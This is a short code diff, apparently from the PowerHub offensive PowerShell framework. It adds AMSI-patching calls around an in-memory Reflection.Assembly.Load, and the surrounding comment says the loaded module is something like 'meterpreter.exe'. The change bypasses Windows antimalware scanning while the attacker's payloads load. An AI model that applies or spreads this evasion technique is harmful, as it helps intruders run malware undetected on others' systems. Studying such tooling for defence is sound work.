@@ -597,7 +597,9 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
 
     foreach ($m in $Module) {
         $code = $PowerHubModulesContent.($m.Name)
+        $originalBytes = Patch-Amsi
         $a = [Reflection.Assembly]::Load([byte[]]$code)
+        Patch-Amsi -restoreBytes $originalBytes
         $al = New-Object -TypeName System.Collections.ArrayList
         $al.add($Arguments)
         if ($OutFile) {
